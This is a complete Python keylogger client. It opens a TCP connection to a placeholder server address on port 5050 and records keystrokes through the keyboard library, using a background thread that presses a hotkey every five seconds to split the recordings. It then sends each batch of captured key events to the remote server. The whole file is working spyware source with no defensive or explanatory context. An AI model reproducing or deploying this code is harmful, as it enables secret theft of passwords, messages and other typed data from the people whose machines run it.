import socket
import keyboard
import time
import threading

HEADER = 64
PORT = 5050
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!DISCONNECT"
SERVER = "Your Ip"
ADDR = (SERVER, PORT)

keyevents = []

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

def send(msg):
    message = msg.encode(FORMAT)
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    client.send(send_length)
    client.send(message)
    print(client.recv(2048).decode(FORMAT))

def timepressed():
    time.sleep(5)
    keyboard.send('ctrl+shift+alt+k')    
    timepressed()

def sendevents():
    strevent = str(keyevents)
    send(strevent)

timepressedtheard = threading.Thread(target=timepressed)
timepressedtheard.start()
#print(events)
while True:
    keyevents.append(keyboard.record('ctrl+shift+alt+k'))
    sendevents()

#send(DISCONNECT_MESSAGE)
